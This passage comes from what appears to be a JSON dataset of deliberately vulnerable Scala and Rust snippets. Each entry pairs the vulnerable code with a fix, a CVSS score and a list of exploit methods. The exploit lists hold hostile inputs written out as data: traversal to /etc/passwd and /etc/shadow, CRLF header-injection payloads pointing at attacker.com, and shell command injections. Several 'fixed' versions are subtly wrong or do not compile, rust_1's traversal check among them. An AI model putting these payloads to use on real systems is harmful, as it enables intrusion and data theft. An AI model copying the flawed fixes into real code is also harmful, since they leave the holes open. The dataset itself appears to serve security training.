            "By using '../config/database.yml', sensitive database credentials can be accessed.",
            "Inputting '..\\..\\flag.txt' on Windows systems may allow attackers to read arbitrary files."
        ]
    },
    "scala_24": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package com.example\n\nimport scala.collection.mutable.ListBuffer\nimport akka.actor.Actor\nimport akka.actor.Props\nimport spray.routing.HttpService\nimport akka.io.IO\nimport spray.can.Http\nimport spray.http.MediaTypes._\n\nobject WebServer {\n  def main(args: Array[String]): Unit = {\n    val system = akka.actor.ActorSystem(\"webserver\")\n    val serviceActor = system.actorOf(Props[WebServer])\n    IO(Http) ! Http.Bind(serviceActor, interface = \"localhost\", port = 8080)\n  }\n}\n\nclass WebServer extends Actor with HttpService {\n  def actorRefFactory = context\n\n  val route =\n    path(\"transfer\") {\n      parameter('amount.as[Int], 'to) { (amount, to) =>\n        // This is vulnerable to CSRF as there's no verification of the request origin.\n        performTransfer(amount, to)\n        complete(s\"Transferred $amount to $to\")\n      }\n    }\n\n  private def performTransfer(amount: Int, to: String): Unit = {\n    // Simulate a transfer operation\n    println(s\"Transferring $amount to $to\")\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package com.example\n\nimport scala.collection.mutable.ListBuffer\nimport akka.actor.Actor\nimport akka.actor.Props\nimport spray.routing.HttpService\nimport akka.io.IO\nimport spray.can.Http\nimport spray.http.MediaTypes._\nimport java.util.UUID\n\nobject WebServer {\n  def main(args: Array[String]): Unit = {\n    val system = akka.actor.ActorSystem(\"webserver\")\n    val serviceActor = system.actorOf(Props[WebServer])\n    IO(Http) ! Http.Bind(serviceActor, interface = \"localhost\", port = 8080)\n  }\n}\n\nclass WebServer extends Actor with HttpService {\n  def actorRefFactory = context\n  val tokenMap = scala.collection.mutable.Map[String, Boolean]()\n\n  def generateToken(): String = {\n    val token = UUID.randomUUID().toString()\n    tokenMap += (token -> true)\n    token\n  }\n\n  val route =\n    path(\"generate-token\") {\n      get {\n        complete(generateToken())\n      }\n    } ~\n    path(\"transfer\") {\n      formFields('amount.as[Int], 'to, 'csrfToken) { (amount, to, csrfToken) =>\n        if (tokenMap.contains(csrfToken)) {\n          tokenMap -= csrfToken\n          performTransfer(amount, to)\n          complete(s\"Transferred $amount to $to\")\n        } else {\n          reject(ValidationRejection(\"Invalid CSRF Token\"))\n        }\n      }\n    }\n\n  private def performTransfer(amount: Int, to: String): Unit = {\n    // Simulate a transfer operation\n    println(s\"Transferring $amount to $to\")\n  }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that sends a request to the /transfer endpoint without user consent.",
            "By tricking a logged-in user into visiting a compromised site, an attacker can use CSRF to transfer funds from the user's account.",
            "The vulnerability allows attackers to perform unauthorized actions on behalf of authenticated users without their knowledge."
        ]
    },
    "scala_25": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import scala.io.Source\n\nclass FileManager {\n    def readFile(filePath: String): String = {\n        val fileContent = Source.fromFile(filePath).getLines().mkString(\"\\n\")\n        fileContent\n    }\n}\n\nobject Main extends App {\n    val fm = new FileManager()\n    println(fm.readFile(args(0)))\n}",
        "cvss_score": 5.3,
        "fixed_code": "import scala.io.Source\nimport java.nio.file.{Paths, Files}\nimport java.nio.file.attribute.BasicFileAttributes\n\nclass FileManager {\n    def readFile(filePath: String): String = {\n        val allowedPath = Paths.get(\"/safe/directory\")\n        val resolvedPath = allowedPath.resolve(Paths.get(filePath)).normalize()\n        if (!resolvedPath.startsWith(allowedPath)) throw new SecurityException(\"Access Denied\")\n        val fileContent = Source.fromFile(resolvedPath.toFile).getLines().mkString(\"\\n\")\n        fileContent\n    }\n}\n\nobject Main extends App {\n    val fm = new FileManager()\n    println(fm.readFile(args(0)))\n}",
        "exploit_ways": [
            "An attacker can input '../../../../etc/passwd' to read the system's password file.",
            "Using relative paths like 'config/../secrets.txt' could expose sensitive configuration data.",
            "Crafting inputs with symbolic links may allow access to unintended files outside the expected directory."
        ]
    },
    "scala_26": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "def unsafeFunction(): Unit = {\n  var counter = 0\n  val threads = List.fill(10)(new Thread(() => {\n    for (_ <- 1 to 1000) counter += 1\n  }))\n  threads.foreach(_.start())\n  threads.foreach(_.join())\n  println(s\"Final counter value: $counter\")\n}",
        "cvss_score": 5.3,
        "fixed_code": "def safeFunction(): Unit = {\n  import java.util.concurrent.atomic.AtomicInteger\n  val counter = new AtomicInteger(0)\n  val threads = List.fill(10)(new Thread(() => {\n    for (_ <- 1 to 1000) counter.incrementAndGet()\n  }))\n  threads.foreach(_.start())\n  threads.foreach(_.join())\n  println(s\"Final counter value: ${counter.get()}\")\n}",
        "exploit_ways": [
            "An attacker could run the function multiple times to observe inconsistent final counter values.",
            "If integrated into a larger system, the race condition might lead to incorrect state updates affecting application behavior.",
            "In rare cases, an attacker could manipulate the timing of thread execution to force specific values in the shared variable."
        ]
    },
    "scala_27": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "def infiniteLoop(): Unit = { while (true) {} }",
        "cvss_score": 3.0,
        "fixed_code": "def controlledLoop(maxIterations: Int): Unit = { var i = 0; while (i < maxIterations) { i += 1 } }",
        "exploit_ways": [
            "An attacker can trigger the infinite loop to consume CPU resources indefinitely.",
            "By calling this function, it can block further execution of other threads or processes in a multi-threaded environment.",
            "If this is part of a web service, it could lead to server unresponsiveness."
        ]
    },
    "scala_28": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "class UnsafeBankAccount {\n  private var balance = 0\n\n  def deposit(amount: Int) = this.synchronized {\n    balance += amount\n  }\n\n  def withdraw(amount: Int) = {\n    if (balance >= amount) {\n      Thread.sleep(10)\n      balance -= amount\n    }\n  }\n}",
        "cvss_score": 5.8,
        "fixed_code": "class SafeBankAccount {\n  private var balance = 0\n\n  def deposit(amount: Int) = this.synchronized {\n    balance += amount\n  }\n\n  def withdraw(amount: Int) = this.synchronized {\n    if (balance >= amount) {\n      Thread.sleep(10)\n      balance -= amount\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can cause a race condition to occur by rapidly depositing and withdrawing funds in different threads, leading to inconsistent balance states.",
            "By timing attacks, an attacker might exploit the sleep delay to interfere with the balance check and subtraction, potentially causing overdrafts or other inconsistencies.",
            "Multiple threads attempting to withdraw simultaneously without proper synchronization can lead to a situation where more is withdrawn than actually deposited."
        ]
    },
    "scala_29": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "def readFileContent(filePath: String): String = {\n    val file = new java.io.File(filePath)\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\n}",
        "cvss_score": 4.0,
        "fixed_code": "def readFileContent(filePath: String, allowedPaths: List[String]): String = {\n    val safePath = allowedPaths.find(filePath.startsWith(_))\n    if (safePath.isDefined) {\n        scala.io.Source.fromFile(filePath).getLines().mkString(\"\")\n    } else {\n        throw new IllegalArgumentException(\"Invalid file path\")\n    }\n}",
        "exploit_ways": [
            "An attacker could input '/etc/passwd' to view the system's password file.",
            "They might try relative paths like '../../conf/server.conf' to access configuration files.",
            "Inputting './logs/access.log' could allow reading server logs, potentially exposing sensitive data."
        ]
    },
    "scala_30": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class UrlRedirector {\n  def redirect(url: String): Unit = {\n    val sanitizedUrl = url.replaceAll(\".*\\\\.evil\\\\..*\", \"\")\n    scala.tools.nsc.io.URL(sanitizedUrl).openStream()\n  }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class UrlRedirector {\n  def redirect(url: String): Unit = {\n    val allowedDomains = List(\"example.com\", \"safe.org\")\n    if (allowedDomains.exists(url.endsWith)) {\n      scala.tools.nsc.io.URL(url).openStream()\n    } else {\n      throw new IllegalArgumentException(\"Invalid URL\")\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.evil.com' to redirect users to an unsafe site.",
            "Using a crafted URL like 'https://legitimate.com/?redirect=http://attackersite.com' could exploit the incomplete check.",
            "Attacker might use URL encoding or other obfuscation techniques to bypass the regex, such as 'http%3A//malicious.evil.com'."
        ]
    },
    "scala_31": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserInfo {\n  private var password: String = \"\"\n  def setPassword(pass: String): Unit = { this.password = pass }\n  def getPassword: String = { this.password }\n}",
        "cvss_score": 3.5,
        "fixed_code": "class UserInfo {\n  private var passwordHash: String = \"\"\n  def setPassword(pass: String): Unit = { this.passwordHash = hashPassword(pass) }\n  def checkPassword(pass: String): Boolean = { hashPassword(pass) == this.passwordHash }\n  private def hashPassword(pass: String): String = java.security.MessageDigest.getInstance(\"SHA-256\").digest(pass.getBytes).map(0xFF & _).map{\"%02x\".format(_)}.mkString}",
        "exploit_ways": [
            "An attacker can call getPassword to retrieve the plain text password.",
            "If the object is serialized, the password could be exposed in logs or backups.",
            "Potential reflection attacks might allow access to private fields."
        ]
    },
    "scala_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import scala.concurrent.{Future, Await}\nimport scala.concurrent.duration._\nimport scala.concurrent.ExecutionContext.Implicits.global\nobject RaceConditionExample {\n  var counter = 0\n  def increment(): Unit = {\n    val localCounter = counter\n    Thread.sleep(1)\n    counter = localCounter + 1\n  }\n  def main(args: Array[String]): Unit = {\n    val futures = for (i <- 1 to 100) yield Future {\n      increment()\n    }\n    Await.result(Future.sequence(futures), Duration.Inf)\n    println(s\"Final counter value: $counter\")\n  }\n}",
        "cvss_score": 5.8,
        "fixed_code": "import scala.concurrent.{Future, Await}\nimport scala.concurrent.duration._\nimport scala.concurrent.ExecutionContext.Implicits.global\nimport scala.util.control.NonFatal\nobject RaceConditionExample {\n  private val lock = new Object()\n  var counter = 0\n  def increment(): Unit = {\n    lock.synchronized {\n      try {\n        val localCounter = counter\n        Thread.sleep(1)\n        counter = localCounter + 1\n      } catch {\n        case NonFatal(e) => e.printStackTrace()\n      }\n    }\n  }\n  def main(args: Array[String]): Unit = {\n    val futures = for (i <- 1 to 100) yield Future {\n      increment()\n    }\n    Await.result(Future.sequence(futures), Duration.Inf)\n    println(s\"Final counter value: $counter\")\n  }\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent final counter values.",
            "By manipulating system timing, an attacker might force the race condition to occur more frequently, leading to incorrect results.",
            "If this code were part of a financial transaction system, incorrect increments could lead to loss of funds."
        ]
    },
    "scala_33": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String): String = {\\n    val redirectUrl = url + \"/welcome\"\\n    \"<script>window.location.href=\\\"\" + redirectUrl + \"\\\"</script>\"\\n}",
        "cvss_score": 6.8,
        "fixed_code": "def safeRedirect(url: String): String = {\\n    val allowedDomains = List(\"example.com\", \"safe.example.org\")\\n    if (allowedDomains.exists(redirectUrl.startsWith)) {\\n        val redirectUrl = url + \"/welcome\"\\n        \"<script>window.location.href=\\\"\" + redirectUrl + \"\\\"</script>\"\\n    } else {\\n        \"Invalid URL\"\\n    }\\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'https://malicious.com' to redirect users away from the legitimate site.",
            "By injecting JavaScript in the URL, attackers could execute arbitrary code in the user's browser, leading to XSS attacks.",
            "Attackers might use the vulnerability to phishing by redirecting users to fake login pages that resemble the actual site."
        ]
    },
    "scala_34": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "def readFile(filePath: String): String = {\\n  scala.io.Source.fromFile(filePath).getLines.mkString(\"\")\\n}",
        "cvss_score": 4.2,
        "fixed_code": "def readFile(filePath: String): String = {\\n  val allowedPaths = List(\"/safe/path1\", \"/safe/path2\")\\n  if (allowedPaths.contains(filePath)) {\\n    scala.io.Source.fromFile(filePath).getLines.mkString(\"\")\\n  } else {\\n    throw new IllegalArgumentException(\"Access denied\")\\n  }\\n}",
        "exploit_ways": [
            "An attacker can provide a path like \"/etc/passwd\" to read sensitive system files.",
            "Using relative paths, attackers might navigate to unauthorized directories by inputting \"../../etc/passwd\".",
            "Exploiting the vulnerability to access application configuration files stored in predictable locations."
        ]
    },
    "scala_35": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "import scala.io.StdIn\n\ndef vulnerableFunction(): Unit = {\n    println(\"Enter your name:\")\n    val name = StdIn.readLine()\n    println(s\"Hello, $name! Welcome to our website.\")\n}\n\nobject Main extends App {\n    vulnerableFunction()\n}",
        "cvss_score": 5.3,
        "fixed_code": "import scala.io.StdIn\nimport java.net.URLEncoder\nimport java.nio.charset.StandardCharsets\n\ndef safeFunction(): Unit = {\n    println(\"Enter your name:\")\n    val name = StdIn.readLine()\n    val encodedName = URLEncoder.encode(name, StandardCharsets.UTF_8.toString())\n    println(s\"Hello, $encodedName! Welcome to our website.\")\n}\n\nobject Main extends App {\n    safeFunction()\n}",
        "exploit_ways": [
            "An attacker could input a name like 'John\\r\\nSet-Cookie: admin=true' to inject HTTP headers.",
            "The vulnerability could be used to split the response and insert malicious HTML content, leading to Cross-Site Scripting (XSS).",
            "By injecting '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 14\\r\\n\\r\\n<h1>Hacked</h1>', an attacker can cause the server to prematurely terminate a response and send a new one."
        ]
    },
    "scala_36": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.http.scaladsl.Http\\nimport akka.http.scaladsl.model.ContentTypes.`text/html(UTF-8)`\\nimport akka.http.scaladsl.server.Directives._\\n\\nobject SimpleWebServer {\\ndef main(args: Array[String]): Unit = {\\n  val route = path(\"hello\") {\\n    get {\\n      complete(HttpEntity(`text/html(UTF-8)`, \"<h1>Hello, world!</h1>\"))\\n    }\\n  }\\n  Http().newServerAt(\"localhost\", 8080).bind(route)\\n}\\n}",
        "cvss_score": 6.5,
        "fixed_code": "import akka.http.scaladsl.Http\\nimport akka.http.scaladsl.model.{ContentTypes, HttpEntity, HttpHeaders}\\nimport akka.http.scaladsl.server.Directives._\\n\\nobject SimpleWebServer {\\ndef main(args: Array[String]): Unit = {\\n  val route = path(\"hello\") {\\n    get {\\n      complete(HttpResponse(entity = HttpEntity(ContentTypes.`text/html(UTF-8)`, \"<h1>Hello, world!</h1>\"), headers = List(HttpHeaders.`Strict-Transport-Security`(maxAgeSeconds = 31536000L), HttpHeaders.`X-XSS-Protection`(\"1; mode=block\"), HttpHeaders.`X-Content-Type-Options`(\"nosniff\"))))\\n    }\\n  }\\n  Http().newServerAt(\"localhost\", 8080).bind(route)\\n}\\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page if user input is rendered without escaping, leading to XSS.",
            "Lack of HSTS header allows attackers to perform man-in-the-middle attacks over unencrypted connections.",
            "Without X-Content-Type-Options header, browsers may try to MIME-sniff and execute files incorrectly."
        ]
    },
    "scala_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String): Unit = { \n    println(s\"Redirecting to: $url\")\n}",
        "cvss_score": 6.0,
        "fixed_code": "def safeRedirect(url: String, allowedDomains: List[String]): Unit = {\n    val parsedUrl = java.net.URL(url)\n    if (allowedDomains.contains(parsedUrl.getHost)) {\n        println(s\"Redirecting to: $url\")\n    } else {\n        println(\"Redirect to unauthorized domain prevented.\")\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site using the vulnerable function.",
            "They can use the vulnerability to redirect users to download malware from malicious websites.",
            "The open redirect can be used in conjunction with social engineering attacks to trick users."
        ]
    },
    "scala_38": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io._\ndef readFile(filePath: String): String = {\n  val file = new File(filePath)\n  val source = Source.fromFile(file)\n  try source.getLines.mkString(\"\\n\") finally source.close()\n}",
        "cvss_score": 4.5,
        "fixed_code": "import java.io._\ndef readFile(baseDir: String, filePath: String): String = {\n  val safePath = new File(baseDir).getCanonicalPath\n  val userFile = new File(safePath, filePath)\n  if (userFile.getCanonicalPath.startsWith(safePath)) {\n    val source = Source.fromFile(userFile)\n    try source.getLines.mkString(\"\\n\") finally source.close()\n  } else {\n    throw new IllegalArgumentException(\"Invalid file path\")\n  }\n}",
        "exploit_ways": [
            "An attacker could input a relative or absolute path to read any accessible file on the server.",
            "Crafting a malicious payload like '../../../../etc/passwd' can be used to access system files.",
            "By manipulating the filePath parameter, attackers might exploit this to read configuration files containing sensitive data."
        ]
    },
    "scala_39": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import java.io._\\n\\nobject LFIExample {\\n  def main(args: Array[String]): Unit = {\\n    val filePath = scala.io.StdIn.readLine(\"Enter file path:\")\\n    val file = new File(filePath)\\n    val reader = new BufferedReader(new FileReader(file))\\n    var line = reader.readLine()\\n    while (line != null) {\\n      println(line)\\n      line = reader.readLine()\\n    }\\n    reader.close()\\n  }\\n}",
        "cvss_score": 5.3,
        "fixed_code": "import java.io._\\nimport scala.util.control.Breaks._\\n\\nobject LFIExample {\\n  def main(args: Array[String]): Unit = {\\n    val allowedPaths = List(\"/safe/path1.txt\", \"/safe/path2.txt\")\\n    val filePath = scala.io.StdIn.readLine(\"Enter file path:\")\\n    if (!allowedPaths.contains(filePath)) {\\n      println(\"Access denied.\")\\n      return\\n    }\\n    val file = new File(filePath)\\n    val reader = new BufferedReader(new FileReader(file))\\n    breakable {\\n      while (true) {\\n        val line = reader.readLine()\\n        if (line == null) break\\n        println(line)\\n      }\\n    }\\n    reader.close()\\n  }\\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read sensitive system files.",
            "By entering \"../../../../../../etc/shadow\", an attacker might attempt to access hashed passwords if not properly restricted.",
            "Crafting a path like \"/var/log/syslog\" could reveal logs containing confidential information."
        ]
    },
    "scala_40": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "object InfiniteLoop {\\ndef main(args: Array[String]): Unit = {\\n  while (true) {\\n    val largeList = List.fill(1000000)(\"a\")\\n    val processedList = largeList.map(_ + \"b\")\\n  }\\n}",
        "cvss_score": 4.5,
        "fixed_code": "object InfiniteLoop {\\ndef main(args: Array[String]): Unit = {\\n  while (true) {\\n    Thread.sleep(1000) // Sleep for a second to avoid consuming excessive resources\\n    val largeList = List.fill(10000)(\"a\") // Reduced list size\\n    val processedList = largeList.map(_ + \"b\")\\n  }\\n}",
        "exploit_ways": [
            "An attacker can run this code to consume all available CPU resources, causing a denial of service.",
            "The loop can be triggered by any user with access to the code, leading to system slowdowns or crashes.",
            "By running multiple instances of this program, an attacker could exhaust memory and cause the system to become unresponsive."
        ]
    },
    "scala_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "def vulnerableRedirect(url: String) = {\n  val encodedUrl = java.net.URLEncoder.encode(url, \"UTF-8\")\n  s\"http://example.com/redirect?target=$encodedUrl\"\n}",
        "cvss_score": 7.5,
        "fixed_code": "def safeRedirect(url: String) = {\n  val allowedDomains = Set(\"trusteddomain1.com\", \"trusteddomain2.com\")\n  val uri = new java.net.URI(url)\n  if (allowedDomains.contains(uri.getHost)) {\n    s\"http://example.com/redirect?target=${java.net.URLEncoder.encode(url, \"UTF-8\")}\"\n  } else {\n    throw new IllegalArgumentException(\"Invalid redirect URL\")\n  }\n}",
        "exploit_ways": [
            "An attacker can input a malicious URL to redirect users to phishing sites.",
            "Could use the vulnerability to launch drive-by downloads by redirecting to compromised servers.",
            "Redirect users to pages that exploit browser vulnerabilities, leading to potential code execution."
        ]
    },
    "scala_42": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.actor.Actor\nimport spray.routing.HttpService\nclass MyServiceActor extends Actor with HttpService {\ndef receive = runRoute {\n    path(\"hello\") {\n        get {\n            complete(\\\"Hello, World!\\\")\n        }\n    }\n}\n}",
        "cvss_score": 6.5,
        "fixed_code": "import akka.actor.Actor\nimport spray.routing.HttpService\nimport spray.http.HttpHeaders._\nclass MyServiceActor extends Actor with HttpService {\ndef receive = runRoute {\n    path(\"hello\") {\n        get {\n            respondWithHeader(`Content-Security-Policy` -> \"default-src 'self'; script-src 'self'\") {\n                respondWithHeader(`X-Frame-Options` -> \"SAMEORIGIN\") {\n                    respondWithHeader(`X-XSS-Protection` -> \"1; mode=block\") {\n                        complete(\\\"Hello, World!\\\")\n                    }\n                }\n            }\n        }\n    }\n}\n}",
        "exploit_ways": [
            "Attacker can perform clickjacking attacks due to lack of X-Frame-Options header.",
            "Cross-site scripting (XSS) might be possible as there is no X-XSS-Protection header set.",
            "Content Security Policy (CSP) is missing, allowing injection of malicious scripts."
        ]
    },
    "scala_43": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "def vulnerableFunction(userInput: String): String = {\n    val response = s\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>$userInput</body></html>\"\n    response\n}",
        "cvss_score": 5.3,
        "fixed_code": "def safeFunction(userInput: String): String = {\n    import java.net.URLEncoder\n    val encodedInput = URLEncoder.encode(userInput, \"UTF-8\").replace(\"+\", \"%20\")\n    val response = s\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>$encodedInput</body></html>\"\n    response\n}",
        "exploit_ways": [
            "An attacker can input 'malicious data\\r\\nSet-Cookie: evil=true' to inject a cookie.",
            "Injecting '\\r\\nLocation: http://attacker.com' redirects the user to an attacker-controlled site.",
            "Can use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><h1>Attacked</h1></html>' to serve a false response."
        ]
    },
    "scala_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "def infiniteLoop(): Unit = {\\n  while (true) {}\\n}",
        "cvss_score": 4.2,
        "fixed_code": "def controlledLoop(): Unit = {\\n  var count = 0\\n  val maxCount = 100000\\n  while (count < maxCount) {\\n    // Perform safe operations here\\n    count += 1\\n  }\\n}",
        "exploit_ways": [
            "An attacker can call the function to cause the application to hang indefinitely, leading to a denial of service.",
            "If this loop is part of a web server, it can prevent other requests from being processed by tying up the thread or process.",
            "In a multi-threaded environment, an attacker could spawn multiple threads running this loop to exhaust system resources."
        ]
    },
    "scala_45": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import javax.servlet.http.{HttpServletRequest, HttpServletResponse}\nclass LoginServlet extends HttpServlet {\n  override def doGet(request: HttpServletRequest, response: HttpServletResponse): Unit = {\n    val session = request.getSession(false)\n    if (session == null) {\n      val newSession = request.getSession(true)\n      newSession.setAttribute(\"userId\", \"defaultUser\")\n    }\n    // Redirect to main page\n    response.sendRedirect(\"/main\")\n  }\n}",
        "cvss_score": 4.2,
        "fixed_code": "import javax.servlet.http.{HttpServletRequest, HttpServletResponse}\nclass LoginServlet extends HttpServlet {\n  override def doGet(request: HttpServletRequest, response: HttpServletResponse): Unit = {\n    val session = request.getSession(false)\n    if (session != null) {\n      session.invalidate()\n    }\n    val newSession = request.getSession(true)\n    newSession.setAttribute(\"userId\", \"defaultUser\")\n    // Redirect to main page\n    response.sendRedirect(\"/main\")\n  }\n}",
        "exploit_ways": [
            "An attacker can set a session cookie in the victim's browser, leading to session fixation.",
            "The attacker can then use this fixed session to perform actions as the authenticated user.",
            "If combined with other vulnerabilities, the attacker could escalate privileges using the fixed session."
        ]
    },
    "scala_46": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\n  def start(): Unit = {\n    println(\"Starting web server...\")\n  }\n}",
        "cvss_score": 5.3,
        "fixed_code": "import akka.http.scaladsl.server.Directives._\nclass WebServer {\n  def start(): Unit = {\n    val route = path(\"/\") {\n      respondWithHeaders(`Strict-Transport-Security`(\"max-age=63072000; includeSubDomains\"), `X-Content-Type-Options`(\"nosniff\"), `X-XSS-Protection`(\"1; mode=block\")) {\n        complete(\"\")\n      }\n    }\n    println(\"Starting web server...\")\n  }\n}",
        "exploit_ways": [
            "An attacker can perform a clickjacking attack due to the absence of X-Frame-Options or Content-Security-Policy headers.",
            "The site is vulnerable to MIME type sniffing attacks as there is no X-Content-Type-Options header set.",
            "Reflected Cross-Site Scripting (XSS) could be possible if proper Content Security Policy (CSP) headers are not implemented."
        ]
    },
    "scala_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import akka.actor.ActorSystem\\nimport akka.http.scaladsl.Http\\nimport akka.http.scaladsl.server.Directives._\\nobject WebServer {\\n  def main(args: Array[String]): Unit = {\\n    implicit val system = ActorSystem(\"my-system\")\\n    implicit val executionContext = system.dispatcher\\n    val route = path(\"hello\") {\\n      get {\\n        complete(\\\"Hello, world!\\\")\\n      }\\n    }\\n    Http().newServerAt(\"localhost\", 8080).bind(route)\\n  }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "import akka.actor.ActorSystem\\nimport akka.http.scaladsl.Http\\nimport akka.http.scaladsl.server.Directives._\\nobject WebServer {\\n  def main(args: Array[String]): Unit = {\\n    implicit val system = ActorSystem(\"my-system\")\\n    implicit val executionContext = system.dispatcher\\n    val route = path(\"hello\") {\\n      get {\\n        complete(\\\"Hello, world!\\\")\\n      }\\n    }.withHeaders(List(`Strict-Transport-Security`(maxAge = 31536000L), `X-Frame-Options`(\"SAMEORIGIN\"), `X-XSS-Protection`(enabled = true)))\\n    Http().newServerAt(\"localhost\", 8080).bind(route)\\n  }\\n}",
        "exploit_ways": [
            "An attacker could perform clickjacking attacks if X-Frame-Options header is missing.",
            "Reflected XSS might be possible due to the absence of Content Security Policy (CSP) headers.",
            "Attackers can gather data over unsecured connections as there's no Strict-Transport-Security header."
        ]
    },
    "scala_48": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "import scala.collection.mutable\nobject RaceConditionExample {\n  val sharedResource = mutable.List[Int]()\n  def main(args: Array[String]): Unit = {\n    val thread1 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        sharedResource += i\n      }\n    })\n    val thread2 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        sharedResource += i\n      }\n    })\n    thread1.start()\n    thread2.start()\n    thread1.join()\n    thread2.join()\n    println(s\"Final size of list: ${sharedResource.size}\")\n  }\n}",
        "cvss_score": 4.5,
        "fixed_code": "import scala.collection.mutable\nobject RaceConditionExample {\n  val sharedResource = mutable.List[Int]()\n  val lock = new Object()\n  def main(args: Array[String]): Unit = {\n    val thread1 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        lock.synchronized {\n          sharedResource += i\n        }\n      }\n    })\n    val thread2 = new Thread(() => {\n      for (i <- 0 until 1000) {\n        lock.synchronized {\n          sharedResource += i\n        }\n      }\n    })\n    thread1.start()\n    thread2.start()\n    thread1.join()\n    thread2.join()\n    println(s\"Final size of list: ${sharedResource.size}\")\n  }\n}",
        "exploit_ways": [
            "An attacker could cause the final list to have a size less than 2000 due to race condition interference.",
            "By controlling timing, an attacker might manipulate the contents of sharedResource in unpredictable ways.",
            "In critical systems, this could lead to data corruption or incorrect computations relying on sharedResource."
        ]
    },
    "scala_49": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class VulnerableApp {\\n  def redirect(url: String): Unit = {\\n    val target = if (url.startsWith(\"http://\")) url else s\"http://${url}\"\\n    println(s\"Redirecting to $target\")\\n  }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "class SecureApp {\\n  def redirect(url: String): Unit = {\\n    val allowedDomains = List(\"example.com\", \"sub.example.com\")\\n    if (allowedDomains.exists(url.endsWith)) {\\n      val target = if (url.startsWith(\"http://\")) url else s\"http://${url}\"\\n      println(s\"Redirecting to $target\")\\n    } else {\\n      throw new Exception(\"Invalid redirect URL\")\\n    }\\n  }\\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://attacker.com' to redirect users away from the intended site.",
            "By providing a crafted URL, an attacker could potentially steal user session cookies if they are not properly secured.",
            "Attackers could use this vulnerability to perform phishing attacks by redirecting users to fake login pages."
        ]
    },
    "rust_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn main() {\n    let user_input = \"echo hello\"; // Simulate user input\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .spawn()\n        .expect(\"Failed to execute command\");\n}",
        "cvss_score": 7.2,
        "fixed_code": "use std::process::Command;\n\nfn main() {\n    let user_input = \"echo hello\"; // Simulate user input\n    Command::new(\"echo\")\n        .arg(user_input)\n        .spawn()\n        .expect(\"Failed to execute command\");\n}",
        "exploit_ways": [
            "User could input 'whoami; id' to see current permissions and user ID.",
            "Could use 'cat /etc/shadow' to attempt reading sensitive files with elevated privileges.",
            "Could chain commands like 'touch /root/testfile' to create a file in the root directory."
        ]
    },
    "rust_1": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    fs::read_to_string(path)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::fs;\nuse std::path::{Path, PathBuf};\n\nfn read_file(base_dir: &str, path: &str) -> Result<String, std::io::Error> {\n    let base_path = Path::new(base_dir);\n    let full_path = base_path.join(path);\n\n    if !full_path.starts_with(base_path) {\n        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, \"Path traversal attempt detected\"));\n    }\n\n    fs::read_to_string(full_path)\n}",
        "exploit_ways": [
            "An attacker can provide a path like '../../etc/passwd' to read the system's password file.",
            "Using '..%2f' instead of '../' in URL-encoded input can bypass simple checks and access files outside the intended directory.",
